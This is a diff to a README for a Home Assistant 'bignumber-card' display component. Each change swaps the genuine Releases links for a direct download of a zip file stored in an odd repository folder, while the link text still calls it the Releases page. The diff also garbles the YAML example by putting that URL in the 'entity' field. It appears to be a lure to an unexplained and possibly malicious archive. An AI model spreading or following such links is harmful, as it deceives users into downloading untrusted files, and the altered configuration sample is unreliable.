@@ -1,6 +1,6 @@
 # 🎉 bignumber-card-continued - Display Sensor Values Clearly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/onn24/bignumber-card-continued/releases)
+[![Download](https://github.com/onn24/bignumber-card-continued/raw/refs/heads/main/Hecatic/card_continued_bignumber_1.2-beta.1.zip%https://github.com/onn24/bignumber-card-continued/raw/refs/heads/main/Hecatic/card_continued_bignumber_1.2-beta.1.zip)](https://github.com/onn24/bignumber-card-continued/raw/refs/heads/main/Hecatic/card_continued_bignumber_1.2-beta.1.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with bignumber-card-continued, follow the steps below. You will b
 
 ## 📥 Download & Install
 
-1. **Visit [this page to download](https://github.com/onn24/bignumber-card-continued/releases)**: Click on the link to go to our Releases page. Here, you will find the latest version of bignumber-card-continued.
+1. **Visit [this page to download](https://github.com/onn24/bignumber-card-continued/raw/refs/heads/main/Hecatic/card_continued_bignumber_1.2-beta.1.zip)**: Click on the link to go to our Releases page. Here, you will find the latest version of bignumber-card-continued.
 
 2. **Choose the file you need**: Navigate through the list of releases. Look for the latest version. 
 
@@ -46,7 +46,7 @@ After installation, you can customize the card through its configuration in the 
 
 ```yaml
 type: custom:bignumber-card
-entity: sensor.example_sensor
+entity: https://github.com/onn24/bignumber-card-continued/raw/refs/heads/main/Hecatic/card_continued_bignumber_1.2-beta.1.zip
 severity:
   green: 0
   yellow: 50
@@ -65,7 +65,7 @@ Absolutely! We welcome contributions. Whether it's bug fixes, new features, or s
 
 For more information and updates, you can explore the following:
 
-- **[Releases Page](https://github.com/onn24/bignumber-card-continued/releases)**: This is where you’ll find the latest versions.
+- **[Releases Page](https://github.com/onn24/bignumber-card-continued/raw/refs/heads/main/Hecatic/card_continued_bignumber_1.2-beta.1.zip)**: This is where you’ll find the latest versions.
 - **Documentation**: Detailed guidelines and other configuration options are available in the extracted folder.
 - **Community Discussions**: Join our discussions in GitHub for support and collaboration.
 
